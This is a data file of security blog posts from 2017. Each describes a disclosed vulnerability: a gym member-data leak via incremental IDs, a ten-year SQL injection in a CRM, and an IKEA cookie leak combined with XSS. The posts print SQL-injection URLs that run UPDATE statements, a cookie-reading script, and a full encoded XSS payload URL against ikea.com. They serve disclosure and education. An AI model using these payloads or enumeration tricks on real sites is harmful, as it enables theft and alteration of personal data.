If companies choose to store images like in this case, they should indeed mention that in the terms of the site. That is not the case here.</b> I also wish they would mention for how long they are storing the images.
`,
                "images": ["/images/leverpostei01.png", "/images/leverpostei02.jpg"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "UUID",
                        "url": "/uuid"
                    },
                    {
                        "title": "Images",
                        "url": "/images"
                    },
                    {
                        "title": "OWASP 2013 A4",
                        "url": "/owasp-2013-a4"
                    }
                ]
            },
            {
                "title": "Case #7: Fitness center chain was leaking personal info",
                "published": true,
                "publishDate": "2017-09-25T05:15:00.000Z",
                "summary": "Is your gym telling on you? It sure was telling on me and my fellow members. Everything from contact info to pictures to bank account numbers to the time people enter the gym was leaking for a long, long time.",
                "niceUrl": "/2017/09/gym-leak",
                "text": `<h4>tl;dr</h4>A fitness center chain consisting of three centers was leaking the members' names, e-mail addresses, phone numbers, pictures, bank account numbers, logs of all visits, etc. They are still running vulnerable server software.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="http://energi-trening.no">Energi Treningssenter</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">High</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>April 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="orange-text">Partially fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>All kinds of personal info was leaked</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>Energi Treningssenter at Askøy is an excellent fitness center. It's modern, big and has all the equipment you want. I used to train there for a while, so I had - and still have - access to the member site where you see your personal details, payment history and full log of your visits.

<b>Some years ago I noticed that the picture taken for the key card to the gym was publicly available. Just knowing the URL you could iterate through the images of all the members without having to be logged in.</b> I never bothered to report it back then. When I started considering this article series I remembered the issue with the pictures and wondered if my personal data was safe. The whole site had much of the feel as <a href="https://blog.roysolberg.com/2017/09/php-hack">the completely vulnerable PHP site</a> I wrote about earlier on.

<h4>Approach (technical stuff)</h4>I logged in to the gym's site while having <a href="https://en.wikipedia.org/wiki/Web_development_tools">the browser development tools</a> open. I looked for anything out of the ordinary in the HTTP calls and in the source code.

<h5>No encryption</h5>The first thing that hit me is that all URLs are <span class="code">http</span> and not <span class="code">https</span>. Even when submitting the form with username and password there is no encryption.

<h5>The secrets of the source</h5><img style="width:480px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Source code from membership page" data-caption="Source code from membership page" src="/images/energi02.png"/>I spotted three links to an <a href="https://en.wikipedia.org/wiki/Active_Server_Pages">ASP</a> that was hidden with CSS: <span class="code">display: none;</span>

The ASP looked like it let you change database fields for any user, but from failing to even change my own data I'm not sure what the deal was. However, this page was vulnerable for <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a>. A good opportunity to steal the session cookie which seems to work perfectly fine across IP addresses. Or one could just let the user send his or her personal data directly.

The source also revealed the use of some kind of "add on" used for file upload. Is it possible to upload code that can be executed? I hope not. I wasn't able to make tell for sure, but there was indeed web forms for uploading all kinds of files.

<h5>Known vulnerabilities</h5>There seems to be three different servers involved serving the site. Looking at the headers and the default error pages reveals outdated server software that have known vulnerabilities. However, <a href="/2017/08/security-vulnerability-disclosures">as I've stated in the background for these posts</a>, that is out of scope for now.

<h5>Plain text passwords</h5>When you log in you will be told if the username you entered exists or not. If you use the "Forgot password" function you're told if you're entering a known e-mail address or not. And the e-mail you receive is not for resetting the password, it just contains both the username and the password. Fail x 3.

<h5>The lucky guess</h5><img style="width:480px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Full list of all visits of other members was available" data-caption="Full list of all visits of other members was available" src="/images/energi03.png"/>The page with all the personal details doesn't have any IDs or anything, but that doesn't mean that I couldn't try adding it. I tried <span class="code">account.asp?id=&lt;some ID&gt;</span>, and voilà, I got access to other users' personal details. The ID was an incremental integer. <b>Iterating the ID one could seemingly get everyone's name, e-mail address, phone number, bank account number, payment history and full visit log.</b>

<h4>Security issues</h4><img style="width:480px;float:left;margin-right:20px;" class="materialboxed responsive-img" title="Membership page with another member's data" data-caption="Membership page with another member's data" src="/images/energi01.png"/>A lot of personal data of previous and current members was leaked:
- Customer number (also used as username)
- <b>Full name</b>
- <b>E-mail address</b>
- <b>Phone number</b>
- <b>Bank account number</b>
- <b>Picture</b>
- Not fixed: <b>Log of all visits</b>
- Full payment history

In addition there are quite a few issues that's probably still making the customer data vulnerable:
 - Not fixed: There's no encryption - not even when logging in
 - Not fixed: Passwords are stored in plain text
 - Not fixed: "Forgot password" e-mail contains both username and password
 - Not fixed: Cross Site Scripting
 - Not fixed: Old application server with known vulnerabilities
 - Not fixed: Old ASP.NET version with known vulnerabilities

I believe that these issues have been around for many years.

<h4>Reception and handling</h4><h5>Day zero</h5>At night I sent an e-mail telling about the information leak and general concerns about the solution.

Just 1,5 hour later I got a reply telling that the issue was forwarded to the right body.

<h5>Day 22</h5>I received an e-mail telling that the vendor of the system had fixed the issue. <b>I see that they have removed the issue with the information leak, but everything else still is the same.</b>

<h4>Conclusion</h4>This is yet another example of our personal data in the wild. There are countless security vulnerabilities out there. You should assume that anyone who wants to, knows everything about you and everything you do. <b>And companies that have these types of vulnerabilities won't tell you when they become aware of them.</b>

And to start connecting the dots between the cases I'm representing; <b>do you remember two weeks ago where you could <a href="/2017/09/skandiabanken-leak">see the bank account balance using just the bank account number</a>? Well, wasn't it nice that this case gave you that bank account number?</b>

<b>Looking at the old versions of the software running on these sites I would definitely guess that the data is still vulnerable.</b>
`,
                "images": ["/images/energi01.png", "/images/energi02.png", "/images/energi03.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "XSS",
                        "url": "/xss"
                    },
                    {
                        "title": "ASP.NET",
                        "url": "/asp-net"
                    },
                    {
                        "title": "Images",
                        "url": "/images"
                    },
                    {
                        "title": "OWASP 2013 A3",
                        "url": "/owasp-2013-a3"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ]
            },
            {
                "title": "Case #8: SQL injection vulnerable for 10 years",
                "published": true,
                "publishDate": "2017-10-02T04:55:00.000Z",
                "updateDate": "2017-10-02T07:05:00.000Z",
                "summary": "A company offering an online project and customer relationship management system had a very easy-to-spot SQL injection vulnerability for 10 years or more.",
                "niceUrl": "/2017/10/10-years-of-injection",
                "text": `<h4>tl;dr</h4>A Norwegian company with a centralized online project management tool had an SQL injection vulnerability for at least 10 years.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td>Anonymous, let's call them <a href="https://en.wikipedia.org/wiki/Fictional_company">Acme3</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">Critical</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>Summer 2017 (and possibly 2007)</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="red-text">Poor</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="orange-text">Who knows..</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>SQL injection affecting all customers</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>In 2007 I was working for a company that started using a <a href="https://en.wikipedia.org/wiki/Software_as_a_service">SaaS</a> project tool and, more or less, a complete CRM. As a software developer I personally used it for time-tracking for the projects and customers I was working with.

<b>It was a very poor tool for time-tracking (as most time-tracking tools are even today), but that was soon to be overshadowed when I noticed that the URLs contained <a href="https://en.wikipedia.org/wiki/SQL">SQL</a>. Not only did the service leak data, it was possible to alter data. Not only was this possible within our own company, but this was across all of the service's customers.</b>

I of course told about this to my boss. <b>To emphasize the problem I changed my boss' name to be surrounded by the infamous <a href="https://en.wikipedia.org/wiki/Blink_element">&lt;blink/&gt; tag</a> to make it constantly blink while he was logged in.</b>

I also prepared an article for the great "software engineering disaster blog" <a href="https://thedailywtf.com/">The Daily WTF</a> which I read daily back then. However, I changed jobs in 2007 and soon forgot all about the article, the security hole and Acme3.

Preparing my blog I looked back at some old issues I had screenshot and made notes from and of course found this one. <b>Checking out their online demo I saw that they still had the SQL injection issue. 10 years later.</b> Seeing the old screenshots that says "Copyright 2000" one can wonder how many their customers who have been affected by this.

<h4>Approach (technical stuff)</h4>You don't need very heavy measures to find any issues when you find out that the URLs of a site actually uses SQL. The URLs were "concealed" because of the site using <a href="https://en.wikipedia.org/wiki/Framing_(World_Wide_Web)">frames</a>. I had a look at their JavaScript and noticed that it built SQL queries which was used as URL parameters.

The URLs looked like this: <pre class="prettyprint lang-html">http://example.com/lookup.asp
?title=Employees&list=0&headers=Employee+Id;First+name;Last+name
&select=SELECT+EMPLOYEE_ID,FIRST_NAME,LAST_NAME+FROM+EMPLOYEES
&goURL=someother.asp&key=EmployeeID&projID=&where=&order=3&records=all</pre>
It can't really get much worse than this.

<b>So from here one could change the query to e.g. include the password.</b> It's hard to believe, but it does actually look like they have some <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a> in the password hashes. <b>But that doesn't matter much as it was possible to run <span class="code">UPDATE</span> statements using the URL.</b>

My favorite changes I did was in the line of these:
<pre class="prettyprint lang-html">http://example.com/lookup.asp?headers=version
&select=<b>UPDATE+EMPLOYEES+SET+FIRST_NAME='&lt;blink&gt;<blink>John+Boss</blink>&lt;/blink&gt;'</b>
+WHERE+USER_ID='myboss';SELECT+@@VERSION,@@VERSION+AS+ver&order=ver</pre><pre class="prettyprint lang-html">http://example.com/lookup.asp?headers=version
&select=<b>UPDATE+EMPLOYEES+SET+FIRST_NAME='John+&quot;I+better+report+these+security+issues+to+Acme3+soon&quot;+Boss'</b>
+WHERE+USER_ID='myboss';SELECT+@@VERSION,@@VERSION+AS+ver&order=ver</pre>
<b>But what was even more worrying was that each company had a different database in the same database server, and it was possible to do queries across databases.</b> I never tried altering data for other companies, but gaining read access is bad enough. The database user seemed to have access to all kinds of databases and system tables.

<h4>Security issues</h4>Depending on how a company was using the service it was possible for anyone to get access to the following information:
- <b>Employees' names, usernames, position, password hashes, addresses, phone numbers, e-mail addresses, pictures, payrolls</b>
- <b>All kinds of info about companies' projects</b>
- <b>Customers of the company</b>
- <b>Outoing invoices</b>
- <b>Budgets</b>
- <b>Accounting</b>
- Timesheets
- And everything else you would expect from a borderline project tool/CRM

From the look of it was possible to alter any data as well.

<h4>Reception and handling</h4><h5>Day zero 2017</h5>The company was non-existing in social media etc. I never managed to find any e-mail addresses. But <b>they had a contact form on their website which I used to tell them about this.</b> The only problem was that the form doesn't work at all in some browsers and doesn't give any feedback if it's been successfully submitted in the rest of the browsers.

<b>I got no response.</b>

<h5>Day 14ish</h5><b>I tried the contact form once again just asking if the form was working at all. I never got an answer.</b>

<h5>Day 21ish</h5><b>Suddenly one night there was someone online on a chat on their site.</b> I filled in my name and asked if the contact form on their site worked. The guy just replied <i>"We saw your "security" report"</i>. What? Why haven't they contacted me? He went on telling that the issue is fixed now. They <i>"had a round of security this summer"</i>. Then he told me to say if I saw anything else, gave me a short "thank you" and finished <i>"night"</i>.

I'm not sure if the conversation was directly unfriendly, but it sure wasn't friendly. And it makes me think that this isn't serious people. Though, at least now I knew the issue was reported and they claimed to have fixed it. I don't want to check.

<h4>Anonymous you say?</h4>This is a bit of a special case going back so many years. Did they receive any reports 10 years ago at all? It would be easier to name them if I was able to communicate with them. The not-so-friendly support chat gave me some bad vibes, and I haven't been able to find out much about the company or the people behind it.

From public financial information I see that they have had 1-2 million USD in annual revenue the last 10 years. As far as I can understand they don't have any other products, so they should have quite a few customers using this service.

<h4>Conclusion</h4>From time to time there are news articles about <a href="https://en.wikipedia.org/wiki/Industrial_espionage">industrial espionage</a>. Companies like Acme3 sure makes it easy to those looking for data.

<b>Are you working in one of the companies using this system? Maybe you should use an expert to take a quick look at the systems where your company stores information you don't want to be leaked or even altered.</b>

<b>Is it possible that an issue like this was existing for ten years without no one taking advantage of it? That's hard to believe.</b>
`,
                "images": [],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "XSS",
                        "url": "/xss"
                    },
                    {
                        "title": "ASP.NET",
                        "url": "/asp-net"
                    },
                    {
                        "title": "Microsoft SQL Server",
                        "url": "/mssql"
                    },
                    {
                        "title": "Data alteration",
                        "url": "/data-alteration"
                    },
                    {
                        "title": "OWASP 2013 A1",
                        "url": "/owasp-2013-a1"
                    },
                    {
                        "title": "OWASP 2013 A3",
                        "url": "/owasp-2013-a3"
                    }
                ]
            },
            {
                "title": "DOM II: JavaScript Hell",
                "published": true,
                "publishDate": "2017-10-05T19:30:00.000Z",
                "summary": "Have some fun destroying websites using my bookmarklet.",
                "niceUrl": "/2017/10/dom2-bookmarklet",
                "text": `<h4>Bookmarklet</h4><p style="text-align:center;"><a onclick="ga('send','event','game','play','dom2',2);return true;" href="javascript:var%20s=document.createElement('script');s.type='text/javascript';s.onerror=function(e){alert('Failed%20to%20load%20the%20script.%20The%20site\\'s%20Content%20Security%20Policy%20might%20be%20blocking%20it.%20Feel%20free%20to%20try%20again.');};document.body.appendChild(s);s.src='https://blog.roysolberg.com/js/dom2.min.js';void(0);" class="waves-effect waves-light btn-large">DOM II: JavaScript Hell</a></p>
<b>Just click the button to play the game on this page.</b>

<b>To try it on other pages, just drag the button to your bookmark row in your browser.</b> After that you can just click the bookmark when visiting other sites.

<h4>What's a bookmarklet?</h4>A <a href="https://en.wikipedia.org/wiki/Bookmarklet">bookmarklet</a> is a bookmark stored in a web browser that contains JavaScript commands that add new features to the browser. Bookmarklets can be useful tools, e.g. for increasing the readability of web pages, do seaches, create short urls, etc.

<a onclick="ga('send','event','game','play','dom2',3);return true;" href="javascript:var%20s=document.createElement('script');s.type='text/javascript';s.onerror=function(e){alert('Failed%20to%20load%20the%20script.%20The%20site\\'s%20Content%20Security%20Policy%20might%20be%20blocking%20it.%20Feel%20free%20to%20try%20again.');};document.body.appendChild(s);s.src='https://blog.roysolberg.com/js/dom2.min.js';void(0);">DOM II: JavaScript Hell</a> might not be very useful, but hopefully it's an enjoyable small game if you're bored or if you're disliking a web site. :)

<h4>Inspiration</h4>I never forgot about the similar <a href="https://github.com/erkie/erkie.github.com">bookmarklet created by Erik Rothoff Andersson</a> in 2010. I wanted to create something like that, but with my own code and my own twists and also have mobile support.

Oh, and the name? Since this game is all about <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> manipulation I figured that the name would be a nice play-on-words and tribute to Doom and more specifically <a href="https://en.wikipedia.org/wiki/Doom_II:_Hell_on_Earth">Doom II: Hell on Earth</a>.

<h4>Security</h4>As <a href="/category/security">I write a bit about security</a> I think it's natural to give you a word of warning when it comes to bookmarklets. My bookmarklet is safe to use, but you shouldn't take my word for it. You should never run bookmarklets on pages that have private information stored on it. Luckily, today online banks etc. uses a <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> that will stop bookmarklets to be run on their page. Otherwise one would risk e.g. financial or private information getting in the wrong hands.

<h4>Feedback</h4>Please leave a comment or send me an e-mail if you see any bugs or have have any suggestions for the game. My guess is that there will be quite a few mobile devices having the some odd values reported from the gyroscope.
`,
                "images": [],
                "links": [],
                "category":
                {
                    "title": "Software development",
                    "url": "/software-development"
                },
                "tags": [
                    {
                        "title": "JavaScript",
                        "url": "/javascript"
                    },
                    {
                        "title": "Bookmarklet",
                        "url": "/bookmarklet"
                    },
                    {
                        "title": "Game",
                        "url": "/game"
                    }
                ]
            },
            {
                "title": "Case #9: IKEA is telling your name to everyone on the Internet",
                "published": true,
                "publishDate": "2017-10-09T05:35:00.000Z",
                "summary": "Ever been logged in at ikea.com? Then there's a chance you don't surf very anonymously.",
                "niceUrl": "/2017/10/ikea-name-leak",
                "text": `<h4>tl;dr</h4>ikea.com stores logged-in users' names in a cookie that is sent unencrypted over http. They also had an XSS vulnerability that made it easy to get hold of the name.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="http://ikea.com">IKEA</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="green-text">Low</span> to <span class="orange-text">medium</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>August 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="red-text">Poor</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="orange-text">Partially fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Cookie with full name sent over HTTP and XSS to get hold of it.</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>I have both ordered stuff online at ikea.com and also designed kitchen and walk-in warderobe using their planners. That means that I have an online account there.

I have always liked IKEA. Lots of cheap furnitures and other products, and mostly good value for the money. Even though they figured out warehouses a long time ago I have bad experiences with their online store. They didn't deliever the products on the estimated dates, they didn't deliver the right amount of stuff and they were unable to deliever the whole order, making me stuck with stuff I had to store and couldn't start to assemble.

<h4>Approach (technical stuff)</h4>I browsed ikea.com while having the <a href="https://en.wikipedia.org/wiki/Web_development_tools">browser development tools</a> open.

<h5>Cookie with name and location</h5>Looking at the site's cookies I noticed that some of the values clearly was <a href="https://en.wikipedia.org/wiki/Base64">Base64 encoded</a>. They store so many cookies that there might be some more hidden treasures, but I decoded a few and found that my full name and selected IKEA warehouse was stored in one of them. Also there was one without any encoding with my postal code and place.

Using a script like the following is a quick and dirty way of getting the cookie names and values (though some have parts of the values as BASE64 encoded):
<pre class="prettyprint lang-js">document.cookie.split(';').forEach(
    function(cookie){
        var parts = cookie.split('=',2);
        console.log(
            parts[0] + ' = '
             + decodeURIComponent(
                 function(parts){
                    try{
                        return parts[1] + ' / '
                        + atob(parts[1]);
                    }catch(e){
                        return parts[1];
                    }
                }(parts)));
    }
);</pre>
<a class="code" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/decodeURIComponent">decodeURIComponent()</a> is used for decoding the URL encoded values.
<a class="code" href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/atob">atob()</a> is used for decoding the Base64 encoded values.

<img style="float:left;width:450px;margin-right:20px;" class="materialboxed responsive-img" title="Some of the many cookies on ikea.com. The one called 'user_info_16' contains the user's name and is not flagged as HttpOnly or Secure." data-caption="Some of the many cookies on ikea.com. The one called 'user_info_16' contains the user's name and is not flagged as HttpOnly or Secure." src="/images/ikea01.png">ikea.com is served both with and without SSL. The cookies containing name and location is not flagged with either <a class="code" href="https://en.wikipedia.org/wiki/HTTP_cookie#HttpOnly_cookie">HttpOnly</a> or <a class="code" href="https://en.wikipedia.org/wiki/HTTP_cookie#Secure_cookie">Secure</a>. That means two things; your name is sent unencrypted over the Internet if you type in <span class="code">ikea.com</span> in your browser, and the cookie can be stolen via <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a>.

<h5>XSS</h5>I didn't find any XSS vulnerabilities, but a quick Google search led me to <a href="https://www.openbugbounty.org/search/?search=ikea.com&type=host">https://www.openbugbounty.org/search/?search=ikea.com&type=host</a> telling about several possibilities for XSS.

There's nothing like a proper "proof of concept" when reporting a bug or security issue, so I created a small JavaScript for fetching a user's name:
<pre class="prettyprint lang-js">var index;
var key = 'user_info_16=';
index = document.cookie.indexOf(key);
if (index === -1) {
    alert('You have not visited ikea.com, have you?');
} else {
    var temp = document.cookie.substring(index + key.length);
    temp = temp.substring(0, temp.indexOf(';'));
    if (temp === 'notloggedin') {
        alert('You are not logged in, are you?');
    } else {
        temp = atob(temp);
        temp = decodeURIComponent(temp);
        temp = temp.split(';');
        alert('Is your name ' + temp[0] + ' ' + temp[1] + '?');
    }
}</pre>
The script searches for the <span class="code">user_info_16</span> cookie, decodes the Base64 encoding and extracts the user's name and presents it in a dialog.

Removing the line breaks, URL encoding and appending it to the URL with the XSS vulnerability left me with the URL <a href="http://www.ikea.com/no/no/catalog/categories/departments/bedroom/tools/cobe/roomset/20161_cosl01a/%252Fpl%252Fpl%252Fcatalog%252Fcategories%252Fdepartments%252Fbedroom%252Ftools%252Fcobe%252Froomset%252F20161_cosl01a%253Fcid%253Dpl%25253Eot%25253Egoogle_plus%25253Eikea_share/u0026gsrc/u003d3p/u0026ic/u003d1/u0026jsh/u003dm;/_/scs/apps-static/_/js/k%3Doz.gapi.da.V3wBH64AFtA.O/m%3D__features__/am%3DAQ/rt%3Dj/d%3D1/rs%3DAGLTcCPcFVjcjQUijyKE8VUwPY2wbCZTVAp76e5%2522%253e%253cimg%2520src%253Da%2520onerror%253D%2522var%2520index%253Bvar%2520key%253D%2527user_info_16%253D%2527%253Bindex%253Ddocument.cookie.indexOf(key)%253Bif(index%253D%253D%253D-1)%257Balert(%2527You%2520have%2520not%2520visited%2520ikea.com%252C%2520have%2520you%253F%2527)%253B%257Delse%257Bvar%2520temp%253Ddocument.cookie.substring(index%252Bkey.length)%253Btemp%253Dtemp.substring(0%252Ctemp.indexOf(%2527%253B%2527))%253Bif(temp%253D%253D%253D%2527notloggedin%2527)%257Balert(%2527You%2520are%2520not%2520logged%2520in%252C%2520are%2520you%253F%2527)%253B%257Delse%257Btemp%253Datob(temp)%253Btemp%253DdecodeURIComponent%2520(temp)%253Btemp%253Dtemp.split(%2527%253B%2527)%253Balert(%2527Is%2520your%2520name%2520%2527%252Btemp%255B0%255D%252B%2527%2520%2527%252Btemp%255B1%255D%252B%2527%253F%2527)%253B%257D%257D%2522%253E%252F">http://www.ikea.com/no/no/catalog/categories/departments/bedroom/tools/cobe/roomset/20161_cosl01a/%252Fpl%252Fpl%252Fcatalog%252Fcategories%252Fdepartments%252Fbedroom%252Ftools%252Fcobe%252Froomset%252F20161_cosl01a%253Fcid%253Dpl%25253Eot%25253Egoogle_plus%25253Eikea_share/u0026gsrc/u003d3p/u0026ic/u003d1/u0026jsh/u003dm;/_/scs/apps-static/_/js/k%3Doz.gapi.da.V3wBH64AFtA.O/m%3D__features__/am%3DAQ/rt%3Dj/d%3D1/rs%3DAGLTcCPcFVjcjQUijyKE8VUwPY2wbCZTVAp76e5%2522%253e%253cimg%2520src%253Da%2520onerror%253D%2522var%2520index%253Bvar%2520key%253D%2527user_info_16%253D%2527%253Bindex%253Ddocument.cookie.indexOf(key)%253Bif(index%253D%253D%253D-1)%257Balert(%2527You%2520have%2520not%2520visited%2520ikea.com%252C%2520have%2520you%253F%2527)%253B%257Delse%257Bvar%2520temp%253Ddocument.cookie.substring(index%252Bkey.length)%253Btemp%253Dtemp.substring(0%252Ctemp.indexOf(%2527%253B%2527))%253Bif(temp%253D%253D%253D%2527notloggedin%2527)%257Balert(%2527You%2520are%2520not%2520logged%2520in%252C%2520are%2520you%253F%2527)%253B%257Delse%257Btemp%253Datob(temp)%253Btemp%253DdecodeURIComponent%2520(temp)%253Btemp%253Dtemp.split(%2527%253B%2527)%253Balert(%2527Is%2520your%2520name%2520%2527%252Btemp%255B0%255D%252B%2527%2520%2527%252Btemp%255B1%255D%252B%2527%253F%2527)%253B%257D%257D%2522%253E%252F</a>.

Now, browsers today often have often implemented some sort of XSS auditor to protect the user, so the above script didn't work out of the box with browsers built on later versions of <a href="https://en.wikipedia.org/wiki/Chromium_(web_browser)">Chromium</a>. So to use this in an attack one would probably have to some browser-depended adjustments. Using an <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a> will probably always find a vulnerability for any browser brand and version.

<img style="float:left;width:450px;margin-right:20px;" class="materialboxed responsive-img" title="The cross-site scripting and cookie vulnerability in action." data-caption="The cross-site scripting and cookie vulnerability in action." src="/images/ikea02.png">The URL worked just fine in the latest version of Firefox, as seen in the screenshot.

<h4>Security issues</h4>The three issues in question were these:
- <b>Logged-in users' full name is sent unencrypted over the Internet</b> (not fixed)
- <b>User's location used for calculating postage is sent unencrypted over the Internet</b> (not fixed)
- <b>It was possible for any website to retrieve your name</b> (fixed (at least for the URL reported))

<h4>Reception and handling</h4><h5>Day zero 2017</h5><b>I searched and searched to find some sort of contact point that wasn't the regular customer service phone. I failed. But I found a list of press contacts and tried the first one. I never got an answer.</b>

<h5>Day 5</h5><b>I sent an e-mail to the second press contact with the first one on copy. I never got an answer.</b>

<h5>Day 18</h5><b>I sent an e-mail to the third press contact with the two first ones on copy. I also mentioned that I was now going to give up.</b>

<h5>Day 19</h5>I didn't hear back from any of the press contacts directly, but I did receive an e-mail from an "mCommerce Specialist" asking for details. I wrote back with the technical details. <b>It took me 19 days to be able to give details about the issues.</b>

I got a reply the same day saying that they were going to look into this. <b>They also said that reports like this should go through their press center. It would be nice if they would write this somewhere on their website, and that the press contacts actually responded.</b>

<h5>Day 59</h5>I asked if they were actually going to do something about this, if I should wait to write about these issues.

<h5>Day 61</h5><b>I got a longer good answer explaining more about the challenges and timeline. They are working on it, but it probably won't be fixed anytime soon.</b>

<h4>Conclusion</h4>As mentioned before, you should assume that anyone who wants to, knows everything about you and everything you do. Even when you think you are anonymous you might not be just that.

If you are concerned about privacy you want to both log out of sites and delete the cache.

I also hope that we'll soon see most websites switch to secure communications only and leave http behind.
`,
                "images": ["/images/ikea01.png", "/images/ikea02.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "XSS",
                        "url": "/xss"
                    },
                    {
                        "title": "OWASP 2013 A3",
                        "url": "/owasp-2013-a3"
                    }
                ]
            },
            {
                "title": "Case #10: Your memories aren't safe",
                "published": true,
                "publishDate": "2017-10-16T05:30:00.000Z",
                "summary": "A digital memory book and social platform for people with special needs was found to be open for anyone to read, change and delete its users' content.",
                "niceUrl": "/2017/10/hackable-digital-memory-book",
                "text": `<h4>tl;dr</h4><i>Memoria</i> - a digital memory book and social platform for persons in care - had a webapp with vulnerabilities for reading, changing and deleting others' messages and pictures.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="http://minmemoria.no/">Memoria</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">High</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>August 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="green-text">Fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Users could read, alter and delete other users contents.</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>Watching the TV one night in August there was this <a href="http://minmemoria.no/wp-content/uploads/2017/05/Memoria-TV2-nyhetene.mp4">news story on TV 2</a> about a digitial memory book and social platform for communication between families, healthcare professionals and users of care services. A great idea and it seemed like a pretty good product. Of course, I wondered if their security was in order. I mean, this is a site with a lot of personal stuff, like messages, pictures and personal stories.

<h4>Approach (technical stuff)</h4>I created a profile and surfed around the site while having my <a href="https://en.wikipedia.org/wiki/Web_development_tools">browser development tools</a> open. The site is running the good old <a href="https://angularjs.org/">Angular 1.X</a> with a lot of Ajax calls transfering JSON with data.

The pages would be of the style <span class="code">https://app.minmemoria.no/#/patients/&lt;some patient ID&gt;/albums</span>. So what would be the URL be for some kind of administrator page?

